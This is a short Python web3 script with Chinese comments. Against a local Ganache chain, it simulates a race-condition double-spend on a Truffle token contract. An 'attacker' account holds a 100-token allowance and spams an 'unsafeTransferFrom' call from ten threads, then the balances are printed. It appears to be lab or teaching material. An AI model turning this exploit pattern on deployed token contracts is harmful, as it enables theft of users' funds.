from web3 import Web3
import threading
import os
import json

# 連接到 Ganache 或其他區塊鏈網路
web3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# 确认连接成功
if not web3.is_connected():
    print("Failed to connect to the Ethereum node.")
    exit()

# 指定Truffle项目路径
truffle_project_path = "truffleProject"

# 读取合约地址
with open(os.path.join(truffle_project_path, 'contractAddr.json')) as f:
    contract_addresses = json.load(f)

# 读取合约ABI
with open(os.path.join(truffle_project_path, 'build/contracts/MyToken.json')) as f:
    token_json = json.load(f)
    token_abi = token_json['abi']


# 获取合约地址
token_contract_address = contract_addresses['MyToken']['address']

# 创建ERC20
contract = web3.eth.contract(address=token_contract_address, abi=token_abi)


# 帳戶 (假設你已經在 Ganache 中解鎖了這些帳戶)
sender_account = web3.eth.accounts[0]
attacker_account = web3.eth.accounts[1]
recipient_account = web3.eth.accounts[2]

decimals = contract.functions.decimals().call()
print(f"Decimals of MyToken: {decimals}")

# 授權給攻擊者帳戶
amount_to_approve = 100
approve_txn = contract.functions.approve(attacker_account, amount_to_approve).transact({'from': sender_account})  # 总共授权 100
web3.eth.wait_for_transaction_receipt(approve_txn)

# 模擬競爭條件
def transfer_from_attacker():
    try:
        transfer_txn = contract.functions.transferFrom(sender_account, recipient_account, amount_to_approve).transact({'from': attacker_account})
        web3.eth.wait_for_transaction_receipt(transfer_txn)
        print("Attacker transfer successful!")
    except Exception as e:
        print(f"Attacker transfer failed: {e}")

def untransfer_from_attacker():
    try:
        transfer_txn = contract.functions.unsafeTransferFrom(sender_account, recipient_account, amount_to_approve).transact({'from': attacker_account})
        web3.eth.wait_for_transaction_receipt(transfer_txn)
        print("Attacker transfer successful!")    
    except Exception as e:
        print(f"Attacker transfer failed: {e}")

threads = []
for _ in range(10):  # 創建多個執行緒模擬同時呼叫
    t = threading.Thread(target=untransfer_from_attacker)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

balance = contract.functions.balanceOf(sender_account).call()
print(f"Sender's balance: {balance}")

balance = contract.functions.balanceOf(attacker_account).call()
print(f"Attacker's balance: {balance}")

balance = contract.functions.balanceOf(recipient_account).call()
print(f"Recipient's balance: {balance}")